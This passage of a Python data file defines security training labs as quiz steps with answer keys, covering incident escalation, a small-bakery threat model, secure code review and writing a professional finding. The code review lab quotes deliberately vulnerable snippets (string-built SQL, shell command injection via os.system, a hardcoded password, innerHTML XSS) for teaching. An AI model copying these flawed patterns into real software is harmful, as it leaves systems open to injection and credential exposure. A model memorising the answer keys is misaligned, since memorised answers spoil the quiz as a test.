      S("On a file server you find a web shell and a ransom note template not created by your team.", "Next step?", ["Ignore", "Stop testing and call the emergency contact - likely real compromise", "Delete the files", "Use the web shell"], 1, "Real incident takes priority."),
    ])

LAB("lab_threat_model", "Threat Model a Small Business", "Security fundamentals", 2, "m05", "decision", 25,
    "Northwind Bakery (fictional) has an online ordering site, a card terminal, staff laptops and a shared Wi-Fi. Build a simple threat model.",
    "Apply CIA, risk and control thinking.",
    ["Identify assets and threats", "Rate risk", "Choose proportionate controls"],
    "Scenario-based", ["Risk matrix"], [],
    ["Which control gives the most risk reduction for least cost?", "Which risk would you accept and why?"],
    "Crown jewels: customer orders/data and payment terminal. Biggest risks: shared Wi-Fi with card terminal, owner account without MFA, no backups. Controls: segment terminal, MFA, backups, patching.",
    "Small businesses benefit most from MFA, backups, updates, segmentation and awareness (e.g. Cyber Essentials-style controls).",
    "Security Defender",
    [Q("Ransomware mainly affects?", ["Availability (and often confidentiality)", "Only integrity", "Nothing", "Only accounting"], 0, "Encrypts systems, often steals data.")],
    steps=[
      S("Assets: ordering website, customer database, card terminal, owner's email, staff laptops.", "Which are the crown jewels?", ["Staff laptops' wallpapers", "Customer database and card terminal", "The printer", "The menu PDF"], 1, "Sensitive data and payments."),
      S("The card terminal and customer Wi-Fi share one network.", "Risk rating?", ["Low", "High - customers can reach the payment device", "None", "Informational"], 1, "Segmentation failure on payment systems."),
      S("Owner's email has no MFA and controls the domain and website.", "Best control?", ["Longer email signature", "Enable phishing-resistant MFA", "Change the logo", "Use SMS only"], 1, "MFA stops most account takeovers."),
      S("There are no backups of the ordering database.", "Which control type is a backup?", ["Preventive", "Detective", "Corrective", "Deterrent"], 2, "It restores after an incident."),
    ])

LAB("lab_code_review", "Secure Code Review", "Programming", 3, "m04", "decision", 25,
    "Review snippets from Silverline's internal tools before release.",
    "Identify the weakness and the right fix.",
    ["Spot injection, secrets and validation issues", "Choose correct fixes"],
    "Code snippets", ["Code review"], [],
    ["Which fix applies to several snippets?", "How would SAST help?"],
    "1) SQLi - parameterise. 2) Command injection - avoid shell, validate with ipaddress. 3) Hardcoded secret - env/vault + rotate. 4) XSS via innerHTML - textContent.",
    "SAST (Semgrep/Bandit), secrets scanning (gitleaks) and code review gates in CI catch these early.",
    "Code Reviewer",
    [Q("Fix for command injection?", ["shell=True", "Avoid the shell; pass args list; validate input", "Base64", "Longer timeout"], 1, "No shell, validated arguments.")],
    steps=[
      S("Python:", "Weakness?", ["XSS", "SQL injection", "CSRF", "None"], 1, "String-built SQL.",
        'cur.execute("SELECT * FROM assets WHERE owner = \'" + owner + "\'")'),
      S("Python ping tool:", "Weakness and fix?", ["None", "Command injection - use subprocess.run(['ping','-c','1', ip]) after ipaddress validation", "SQLi - use ORM", "XSS - encode"], 1, "Untrusted input reaches a shell.",
        'os.system("ping -c 1 " + request.args["host"])'),
      S("Config:", "Weakness?", ["Hardcoded credential", "Weak hash", "Open redirect", "Race condition"], 0, "CWE-798; rotate and move to secrets store.",
        'DB_PASSWORD = "Silverline2026!"'),
      S("JavaScript:", "Fix?", ["Use innerHTML", "Use textContent", "Use eval", "Remove CSP"], 1, "Avoid HTML parsing of user data.",
        'document.getElementById("greeting").innerHTML = "Hello " + params.get("name");'),
    ])

LAB("lab_report_finding", "Write a Professional Finding", "Reporting", 3, "m14", "decision", 20,
    "Turn raw lab notes into a professional finding for the Silverline report.",
    "Pick the best option for each part of the finding.",
    ["Write clear titles and impact", "Assign severity with context", "Write specific remediation"],
    "Scenario-based", ["Report Builder"], [],
    ["How does business impact change the reader's response?", "What makes remediation verifiable?"],
    "Title names the flaw and location; severity High with CVSS + context; impact in business terms; remediation specific; verification by retest with two accounts.",
    "Clear findings speed up remediation, reducing exposure time.",
    "Report Master",
    [Q("Best title?", ["Bad security", "IDOR in Invoice API allows access to other customers' invoices", "Found a bug", "API issue"], 1, "Specific and descriptive.")],
    steps=[
      S("Raw note: 'learner can see bob invoice via /v1/api/invoices/1002'.", "Best title?", ["Bug in API", "Insecure Direct Object Reference in Invoice API", "Hacked invoices", "Problem"], 1, "Specific."),
      S("Severity choice:", "Most professional?", ["Critical because it sounds scary", "High - CVSS 7.7 with personal financial data exposure noted", "Low because it needs login", "Informational"], 1, "Standard score + context."),
      S("Impact statement:", "Best?", ["The API is broken", "Any logged-in customer can view other customers' invoices, exposing personal and financial data", "HTTP 200 returned", "It is vulnerable"], 1, "Business consequence."),
      S("Remediation:", "Best?", ["Fix the API", "Enforce server-side ownership checks on invoice lookups; return 404 for non-owned IDs; add per-role authorisation tests", "Use HTTPS", "Hide IDs"], 1, "Specific and verifiable."),
    ])
